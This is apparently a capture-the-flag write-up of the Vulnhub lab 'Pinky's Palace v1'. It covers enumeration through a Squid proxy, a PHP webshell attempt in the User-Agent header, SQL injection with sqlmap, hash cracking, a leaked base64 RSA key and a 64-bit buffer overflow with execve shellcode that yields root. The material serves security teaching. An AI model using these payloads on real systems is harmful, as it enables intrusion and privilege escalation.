---
title: Vulnhub - Pinky's Palace v1
categories: [Vulnhub, Linux]
date: 2022-02-12
tags: [pivot, exploit/sqli/database-enum, linux-priv-esc/linux-creds-found, bof/linux-bof]
img_path: /Writeups/Vulnhub/Linux/Pinky's Palace v1/images/
image:
  src: Pasted%20image%2020220212222737.png
  width: 900   # in pixels
  height: 50   # in pixels
---

# Recon
## NMAP Complete Scan
```
# Nmap 7.92 scan initiated Sat Feb 12 01:47:10 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/vulnHub/PinkysPalaceV1/192.168.110.27/scans/_full_tcp_nmap.txt -oX /root/vulnHub/PinkysPalaceV1/192.168.110.27/scans/xml/_full_tcp_nmap.xml 192.168.110.27
Nmap scan report for 192.168.110.27
Host is up, received arp-response (0.00036s latency).
Scanned at 2022-02-12 01:47:11 +08 for 33s
Not shown: 65532 closed tcp ports (reset)
PORT      STATE SERVICE    REASON         VERSION
8080/tcp  open  http       syn-ack ttl 64 nginx 1.10.3
|_http-title: 403 Forbidden
|_http-server-header: nginx/1.10.3
31337/tcp open  http-proxy syn-ack ttl 64 Squid http proxy 3.5.23
|_http-title: ERROR: The requested URL could not be retrieved
|_http-server-header: squid/3.5.23
64666/tcp open  ssh        syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 df:02:12:4f:4c:6d:50:27:6a:84:e9:0e:5b:65:bf:a0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/eH9dt7PVqsTKvqz7gb2G/6/0wUl+dy6gSLPDX0bqkIwc5k0IiCefKqk9MpBbTOU6aUWE3T/y9IYCAjhCaW7QTRrrVn+rUviz+8lABk50s29Z5hBEDwMOme+OZ5rTX3z+8096MgbOdgPMEsQbk3W/eWTDNHXUrU9iijz0zcZgC/HkuS+1E/C8IC3+CR30GQTA+cLXD8CKQ38WEukuNbvAlwEtjw3kMGvv74kzek8cVsWQGPB1y2qLv+miQHaWROiP//WzM5e69gXiFRNcC8spesAzRH0pkYXXTDTGpgG3sBu4G+lGBHncU+30a7i2AEtv+tAy0C2bvFYHqymdFJFv
|   256 0a:ad:aa:c7:16:f7:15:07:f0:a8:50:23:17:f3:1c:2e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDZDIHslZJXVJH6dCHGaJRVy8WULZGgoqkKe8gfp/jibTQiMe8lIE8zFX2S8aXxWo4kSBd6i94zKj4YR2TcFj2o=
|   256 4a:2d:e5:d8:ee:69:61:55:bb:db:af:29:4e:54:52:2f (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEKiR+Y3n+2PC1Zjqgt/sE9mBtaxGwqMxPj19s2cpoYU
MAC Address: 08:00:27:3C:08:49 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=2/12%OT=8080%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=080027%TM=6
OS:206A140%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=4%ISR=107%TI=Z%CI=I%II=I%TS
OS:=8)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M
OS:5B4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=71
OS:20)ECN(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=
OS:0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
OS:U1(R=N)IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 0.003 days (since Sat Feb 12 01:43:41 2022)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.36 ms 192.168.110.27

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb 12 01:47:44 2022 -- 1 IP address (1 host up) scanned in 34.67 seconds
```

## TCP/8080 (HTTP)
### FFUF
- No directories enumerated

## TCP/31337 (HTTP Proxy)
### FFUF 
- No directories enumerated





# Initial Foothold

## TCP/31337 (HTTP Proxy) - Adding entry to hosts file
1. Proceed to `http://$ip:31337`
	![](Pasted%20image%2020220212062251.png)
	- `pinkys-palace`
2. Add `pinkys-palace` to `/etc/hosts`
	```
	┌──(root💀kali)-[~/vulnHub/PinkysPalaceV1]
	└─# echo "192.168.110.27 pinkys-palace" >> /etc/hosts
	```


## TCP/8080 (HTTP) - Setting up the Proxy + Directory Enumeration 
1. Proceed to `http://pinkys-palace:8080/`
	![](Pasted%20image%2020220212062444.png)
	``` 
	┌──(root💀kali)-[~/vulnHub/PinkysPalaceV1]
	└─# curl http://pinkys-palace:8080/
	<html>
	<head><title>403 Forbidden</title></head>
	<body bgcolor="white">
	<center><h1>403 Forbidden</h1></center>
	<hr><center>nginx/1.10.3</center>
	</body>
	</html>
	```
	- Still `403 Forbidden`
2. We should be able to bypass `403 Forbidden`  by using the proxy at `TCP/31337 (Squid Proxy)`
3. Add `TCP/31337 - Squid Proxy` to your web browser	
	![](Pasted%20image%2020220212062830.png)
4. Directory enumerate `TCP/8080` - `directory-list-2.3-medium.txt`
	```
	┌──(root💀kali)-[~/vulnHub/PinkysPalaceV1]
	└─# ffuf -u http://pinkys-palace:8080/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e '.html,.txt,.php' -x http://$ip:31337/

			/'___\  /'___\           /'___\       
		   /\ \__/ /\ \__/  __  __  /\ \__/       
		   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
			\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
			 \ \_\   \ \_\  \ \____/  \ \_\       
			  \/_/    \/_/   \/___/    \/_/       

		   v1.3.1 Kali Exclusive <3
	________________________________________________

	 :: Method           : GET
	 :: URL              : http://pinkys-palace:8080/FUZZ
	 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
	 :: Extensions       : .html .txt .php 
	 :: Follow redirects : false
	 :: Calibration      : false
	 :: Proxy            : http://192.168.110.27:31337/
	 :: Timeout          : 10
	 :: Threads          : 40
	 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
	________________________________________________

	littlesecrets-main      [Status: 301, Size: 185, Words: 6, Lines: 8]
	:: Progress: [882240/882240] :: Job [1/1] :: 2392 req/sec :: Duration: [0:05:10] :: Errors: 0 ::
	```
	- `littlesecrets-main`
5. Directory enumerate `littlesecrets-main` - `common.txt`
	```
	┌──(root💀kali)-[~/vulnHub/PinkysPalaceV1]
	└─# ffuf -u http://pinkys-palace:8080/littlesecrets-main/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php' -x http://$ip:31337/

			/'___\  /'___\           /'___\       
		   /\ \__/ /\ \__/  __  __  /\ \__/       
		   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
			\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
			 \ \_\   \ \_\  \ \____/  \ \_\       
			  \/_/    \/_/   \/___/    \/_/       

		   v1.3.1 Kali Exclusive <3
	________________________________________________

	 :: Method           : GET
	 :: URL              : http://pinkys-palace:8080/littlesecrets-main/FUZZ
	 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
	 :: Extensions       : .html .txt .php 
	 :: Follow redirects : false
	 :: Calibration      : false
	 :: Proxy            : http://192.168.110.27:31337/
	 :: Timeout          : 10
	 :: Threads          : 40
	 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
	________________________________________________
	index.html              [Status: 200, Size: 583, Words: 30, Lines: 31]
	login.php               [Status: 200, Size: 68, Words: 8, Lines: 1]
	logs.php                [Status: 200, Size: 6948147, Words: 715900, Lines: 1]
	:: Progress: [18460/18460] :: Job [1/1] :: 3484 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
	```
	- `littlesecrets-main/index.html`
	- `littlesecrets-main/login.php`
	- `littlesecrets-main/logs.php`


## TCP/8080 (HTTP) - SQLi Database Enum w/ SQLMap
1. Proceed to enumerated directories
	- `littlesecrets-main/index.html`
	![](Pasted%20image%2020220212163307.png)
	- `littlesecrets-main/logs.php`
		![](Pasted%20image%2020220212175355.png)
2. Check if we could inject a webshell in the User-Agent field
	``` 
	┌──(root💀kali)-[~/vulnHub/PinkysPalaceV1/192.168.110.27/exploit]
	└─# curl  -H "User-Agent: <?php system(\$_GET['c']); ?>" -X "http://192.168.110.27:31337/" http://pinkys-palace:8080/littlesecrets-main/login.php
	```
	- Failed, it is not logged, this means that there is some sort of input sanitization
6. Check if page is susceptible to SQLi Auth Bypass
	```
	user='OR 1=1#&pass='OR 1=1#
	```
	- Could not bypass login page
7. Determine if page is susceptible to SQLi w/ SQLMap
	```
	┌──(root💀kali)-[~/vulnHub/PinkysPalaceV1/192.168.110.27/exploit]
	└─# sqlmap -r sqli.txt --dbs --output-dir=$(pwd)/sqlmap --proxy=http://192.168.110.27:31337/ --level=5 --risk=3
	
	Parameter: User-Agent (User-Agent)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 OPR/83.0.4254.27' AND (SELECT 6783 FROM (SELECT(SLEEP(5)))aLXs) AND 'xFNY'='xFNY

	available databases [2]:
	[*] information_schema
	[*] pinky_sec_db

	```
8. Enumerate tables in `pinky_sec_db` database
	``` 
	┌──(root💀kali)-[~/vulnHub/PinkysPalaceV1/192.168.110.27/exploit]
	└─# sqlmap -r sqli.txt -D pinky_sec_db --tables --output-dir=$(pwd)/sqlmap --proxy=http://192.168.110.27:31337/ --level=5 --risk=3

	Database: pinky_sec_db
	[2 tables]
	+-------+
	| logs  |
	| users |
	+-------+
	```
9. Dump `users` table from `pinky_sec_db` database
	``` 
	Database: pinky_sec_db
	Table: users
	[2 entries]
	+-----+----------------------------------+-------------+
	| uid | pass                             | user        |
	+-----+----------------------------------+-------------+
	| 1   | f543dbfeaf238729831a321c7a68bee4 | pinky       |
	| 2   | d60dffed7cc0d87e1f4a11aa06ca73af | pinkymanage |
	+-----+----------------------------------+-------------+
	```
10. Crack `md5` hash
	```
	┌──(root💀kali)-[~/vulnHub/PinkysPalaceV1/192.168.110.27/exploit]
	└─# hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt  --show
	d60dffed7cc0d87e1f4a11aa06ca73af:3pinkysaf33pinkysaf3
	```
	- pinkymanage:3pinkysaf33pinkysaf3
11. Login w/ pinkymanage:3pinkysaf33pinkysaf3, failed


## TCP/64666 (SSH)
1. SSH w/ pinkymanage:3pinkysaf33pinkysaf3
	![](Pasted%20image%2020220212205340.png)

# Privilege Escalation

## Pinky - Via Creds Found
1. Proceed to the web directory `/var/www/html/littlesecrets-main/`
	``` 
	pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main$ ls -la
	total 24
	drwxr-xr-x 3 root root 4096 Feb  2  2018 .
	drwxr-xr-x 3 root root 4096 Feb  2  2018 ..
	-rw-r--r-- 1 root root  583 Feb  2  2018 index.html
	-rw-r--r-- 1 root root  934 Feb  2  2018 login.php
	-rw-r--r-- 1 root root  464 Feb  2  2018 logs.php
	drwxr-xr-x 2 root root 4096 Feb  2  2018 ultrasecretadminf1l35
	pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main$ 
	```
	- `ultrasecretadminf1l35`
2. View files in `ultrasecretadminf1l35`
	```
	pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35$ ls -la
	total 16
	drwxr-xr-x 2 root root 4096 Feb  2  2018 .
	drwxr-xr-x 3 root root 4096 Feb  2  2018 ..
	-rw-r--r-- 1 root root   99 Feb  2  2018 note.txt
	-rw-r--r-- 1 root root 2270 Feb  2  2018 .ultrasecret
	pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35$ 
	```
	- `note.txt`
	- `.ultrasecret`
3. View content in the files
	``` 
	pinkymanage@pinkys-palace:/var/www/html/littlesecrets-main/ultrasecretadminf1l35$ cat note.txt .ultrasecret 
	Hmm just in case I get locked out of my server I put this rsa key here.. Nobody will find it heh..
	LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBMTZmeEwzLyto
	L0lMVFpld2t2ZWtoSVExeWswb0xJK3kzTjRBSXRraGV6MTFJaGE4CkhjN0tPeC9MOWcyamQzSDhk
	R1BVZktLcjlzZXF0Zzk3WktBOTVTL3NiNHczUXRsMUFCdS9wVktaQmJHR3NIRy8KeUl2R0VQS1Mr
	QlNaNHN0TVc3SG54N2NpTXVod2Nad0xxWm1zeVN1bUVDVHVlUXN3TlBibElUbHJxb2xwWUY4eApl
	NDdFbDlwSHdld05XY0lybXFyYXhDSDVUQzdVaGpnR2FRd21XM3FIeXJTcXAvaksvY3RiMVpwblB2
	K0RDODMzCnUvVHlqbTZ6OFJhRFpHL2dSQklyTUduTmJnNHBaRmh0Z2JHVk9mN2ZlR3ZCRlI4QmlU
	KzdWRmZPN3lFdnlCeDkKZ3hyeVN4dTJaMGFPTThRUjZNR2FETWpZVW5COWFUWXV3OEdQNHdJREFR
	QUJBb0lCQUE2aUg3U0lhOTRQcDRLeApXMUx0cU9VeEQzRlZ3UGNkSFJidG5YYS80d3k0dzl6M1Mv
	WjkxSzBrWURPbkEwT1VvWHZJVmwvS3JmNkYxK2lZCnJsZktvOGlNY3UreXhRRXRQa291bDllQS9r
	OHJsNmNiWU5jYjNPbkRmQU9IYWxYQVU4TVpGRkF4OWdrY1NwejYKNkxPdWNOSUp1eS8zUVpOSEZo
	TlIrWVJDb0RLbkZuRUlMeFlMNVd6MnFwdFdNWUR1d3RtR3pPOTY4WWJMck9WMQpva1dONmdNaUVp
	NXFwckJoNWE4d0JSUVZhQnJMWVdnOFdlWGZXZmtHektveEtQRkt6aEk1ajQvRWt4TERKcXQzCkxB
	N0pSeG1Gbjc3L21idmFEVzhXWlgwZk9jUzh1Z3lSQkVOMFZwZG5GNmtsNnRmT1hLR2owZ2QrZ0Fp
	dzBUVlIKMkNCN1BzRUNnWUVBOElXM1pzS3RiQ2tSQnRGK1ZUQnE0SzQ2czdTaFc5QVo2K2JwYitk
	MU5SVDV4UkpHK0RzegpGM2NnNE4rMzluWWc4bUZ3c0Jobi9zemdWQk5XWm91V3JSTnJERXhIMHl1
	NkhPSjd6TFdRYXlVaFFKaUlQeHBjCm4vRWVkNlNyY3lTZnpnbW50T2liNGh5R2pGMC93bnRqTWM3
	M3h1QVZOdU84QTZXVytoZ1ZIS0VDZ1lFQTVZaVcKSzJ2YlZOQnFFQkNQK3hyQzVkSE9CSUVXdjg5
	QkZJbS9Gcy9lc2g4dUU1TG5qMTFlUCsxRVpoMkZLOTJReDlZdgp5MWJNc0FrZitwdEZVSkxjazFN
	MjBlZkFhU3ZPaHI1dWFqbnlxQ29mc1NVZktaYWE3blBRb3plcHFNS1hHTW95Ck1FRWVMT3c1NnNK
	aFNwMFVkWHlhejlGUUFtdnpTWFVudW8xdCtnTUNnWUVBdWJ4NDJXa0NwU0M5WGtlT3lGaGcKWUdz
	TE45VUlPaTlrcFJBbk9seEIzYUQ2RkY0OTRkbE5aaFIvbGtnTTlzMVlPZlJYSWhWbTBaUUNzOHBQ
	RVZkQQpIeDE4ci8yRUJhV2h6a1p6bGF5ci9xR29vUXBwUkZtbUozajZyeWZCb21RbzUrSDYyVEE3
	bUl1d3Qxb1hMNmM2Ci9hNjNGcVBhbmcyVkZqZmNjL3IrNnFFQ2dZQStBenJmSEZLemhXTkNWOWN1
	ZGpwMXNNdENPRVlYS0QxaStSd2gKWTZPODUrT2c4aTJSZEI1RWt5dkprdXdwdjhDZjNPUW93Wmlu
	YnErdkcwZ016c0M5Sk54SXRaNHNTK09PVCtDdwozbHNLeCthc0MyVng3UGlLdDh1RWJVTnZEck9Y
	eFBqdVJJbU1oWDNZU1EvVUFzQkdSWlhsMDUwVUttb2VUSUtoClNoaU9WUUtCZ1FEc1M0MWltQ3hX
	Mm1lNTQxdnR3QWFJcFE1bG81T1Z6RDJBOXRlRVBzVTZGMmg2WDdwV1I2SVgKQTlycExXbWJmeEdn
	SjBNVmh4Q2pwZVlnU0M4VXNkTXpOYTJBcGN3T1dRZWtORTRlTHRPN1p2MlNWRHI2Y0lyYwpIY2NF
	UCtNR00yZVVmQlBua2FQa2JDUHI3dG5xUGY4ZUpxaVFVa1dWaDJDbll6ZUFIcjVPbUE9PQotLS0t
	LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=
	```
	- The key is base64 encoded, `=` is used as padding for base64
4. Decode
	```
	┌──(root💀kali)-[~/vulnHub/PinkysPalaceV1/192.168.110.27/exploit]
	└─# base64 -d encoded.txt > id_rsa; chmod 600 id_rsa
	```
5. SSH into `pinky` w/ `id_rsa`
	![](Pasted%20image%2020220212210720.png)

## Root - Via Buffer Overflow (64 Bit)
1. View files in pinky's home directory
	```
	pinky@pinkys-palace:~$ ls -la
	total 44
	drwx------ 3 pinky pinky 4096 Feb  2  2018 .
	drwxr-xr-x 4 root  root  4096 Feb  2  2018 ..
	-rwsr-xr-x 1 root  root  8880 Feb  2  2018 adminhelper
	lrwxrwxrwx 1 root  root     9 Feb  1  2018 .bash_history -> /dev/null
	-rw-r--r-- 1 pinky pinky  220 Jan 28  2018 .bash_logout
	-rw-r--r-- 1 pinky pinky 3526 Jan 28  2018 .bashrc
	lrwxrwxrwx 1 pinky pinky    9 Feb  1  2018 .mysql_history -> /dev/null
	-rw-r--r-- 1 root  root   280 Feb  2  2018 note.txt
	-rw-r--r-- 1 pinky pinky  675 Jan 28  2018 .profile
	drwx------ 2 pinky pinky 4096 Feb  2  2018 .ssh
	-rw------- 1 pinky pinky 1815 Feb  2  2018 .viminfo
	```
	- `adminhelper`
	- `note.txt`
2. View content of the files 
	```
	pinky@pinkys-palace:~$ cat note.txt 
	Been working on this program to help me when I need to do administrator tasks sudo is just too hard to configure and I can never remember my root password! Sadly I'm fairly new to C so I was working on my printing skills because Im not sure how to implement shell spawning yet :(
	pinky@pinkys-palace:~$ 
	```
3. Execute `adminhelper` to see what it does
	``` 
	pinky@pinkys-palace:~$ ./adminhelper $(python -c 'print "A" * 500')
	Segmentation fault
	```
	- Buffer Overfow Binary
4. Determine if ASLR is disabled
	```
	pinky@pinkys-palace:~$ cat /proc/sys/kernel/randomize_va_space
	0
	```
5. Transfer `adminhelper` to kali
6. Determine buffer size to crash `adminhelper`
	- Buffer Size: 100
	![](Pasted%20image%2020220212212236.png)
7.  Create pattern
	```
	pattern_create 100
	AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
	
	run $(python -c 'print "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL"')
	```
	![](Pasted%20image%2020220212212534.png)
		![](Pasted%20image%2020220212212505.png)
8. Determine EIP offset
	```
	pattern_offset IAAeAA4AAJAAfAA5AAKAAgAA6AAL
	```
	![](Pasted%20image%2020220212212633.png)
	![](Pasted%20image%2020220212213753.png)
	- RIP offset: 72
9. Test RIP offset w/ Bs
	```
	run $(python -c 'print "A" * 72 + "B" * 6')
	```
	![](Pasted%20image%2020220212215638.png)
7. Since ASLR is disabled, we can store our shellcode into an environment variable.
8. After storing shellcode into an environment variable, we can use [`getenvaddr.c`](https://gist.githubusercontent.com/superkojiman/6a6e44db390d6dfc329a/raw/892300db69d14f08af5205e35dede43391d56c70/getenvaddr) to determine the environment variable address
9. Continue exploit on target 
10. Store our [shellcode](http://shell-storm.org/shellcode/files/shellcode-806.php) into an environment variable
	```
	export shellcode=$(python -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"')
	```
	![](Pasted%20image%2020220212220956.png)
10. Determine the environment variable address w/ `getenv.c`
	```
	pinky@pinkys-palace:~$ nc 192.168.110.4 4444 > getenvaddr.c
	pinky@pinkys-palace:~$ gcc getenvaddr.c -o getenvaddr
	pinky@pinkys-palace:~$ ./getenvaddr shellcode ./adminhelper 
	shellcode will be at 0x7fffffffeeb9
	pinky@pinkys-palace:~$ 
	```
	- Return Address: `0x7fffffffeeb9`
	- Little Endian: `\xb9\xee\xff\xff\xff\x7f`
11. Obtain root shell
	```
	pinky@pinkys-palace:~$ ./adminhelper $(python -c 'print "A" * 72 + "\xb9\xee\xff\xff\xff\x7f"')
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�����
	# id
	uid=1000(pinky) gid=1000(pinky) euid=0(root) groups=1000(pinky),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
	# whoami
	root
	# 
	```
	![](vmware_NqYOGoXLyM.gif)

12. Root Flag
	``` 
	root
	# cd /root
	# ls
	root.txt
	# cat root.txt	
	===========[!!!CONGRATS!!!]===========

	[+] You r00ted Pinky's Palace Intermediate!
	[+] I hope you enjoyed this box!
	[+] Cheers to VulnHub!
	[+] Twitter: @Pink_P4nther

	Flag: 99975cfc5e2eb4c199d38d4a2b2c03ce
	# 
	```



